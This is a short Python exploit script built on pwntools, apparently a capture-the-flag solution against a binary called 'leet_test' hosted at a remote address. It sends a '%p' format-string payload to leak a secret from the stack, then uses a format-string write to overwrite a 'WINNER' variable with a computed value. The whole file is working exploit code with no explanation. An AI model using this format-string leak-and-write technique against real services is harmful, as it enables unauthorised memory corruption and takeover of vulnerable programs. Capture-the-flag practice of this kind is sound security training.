from pwn import *

context.arch = 'x86_64'

WINNER = 0x00404078
leetcode = 0x1337c0de

# p = process('./leet_test')
p = remote('46.101.91.21', 31093)

print(p.recv())

##debug getting random secret 
# gdb.attach(p, gdbscript='''
# b *0x004013a7
# c
# ''')

#get random secret
p.sendline("%p##"*7)
output = p.recv()
print(output)
secrethex = output.decode('latin-1').split('##')[6]
secrethex = secrethex[2:][:4]
secret = int(secrethex, 16)
print(f"Found secret {hex(secret)}")

def exec_fmt(payload):
    print(payload)
    p.sendline(payload)
    output = p.recv()
    print(output)
    return output

target = leetcode * secret

f = FmtStr(exec_fmt)
f.write(WINNER, target)
f.execute_writes()
